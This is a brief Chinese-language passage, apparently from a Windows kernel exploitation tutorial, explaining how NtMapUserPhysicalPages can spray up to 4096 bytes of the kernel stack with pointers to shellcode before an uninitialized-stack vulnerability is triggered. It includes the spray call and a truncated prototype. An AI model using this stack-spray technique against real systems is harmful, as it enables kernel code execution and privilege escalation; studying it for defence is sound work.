大致的先讲一下思路 我们先利用`NtMapUserPhysicalPages`进行栈喷射 将栈中的数据覆盖为我们shellcode 然后使用漏洞点 将其使用我们刚才我们控制的栈

```c

__in PVOID VirtualAddress,
__in ULONG_PTR NumberOfPages,
__in_ecount_opt(NumberOfPages) PULONG_PTR UserPfnArray
)
(...)

```

我们也可以看到`COPY_STACK_SIZE`是缓冲区栈值的大小 所以它可以使用户传递1024*4=4096个字节的值

```c
#define COPY_STACK_SIZE 1024
```

即可以用来控制最多4096个字节的内核栈 我们将shellcode的位置传到此处 而我们使用的为

```c
NtMapUserPhysicalPages(NULL, 1024, StackSprayBuffer);
```
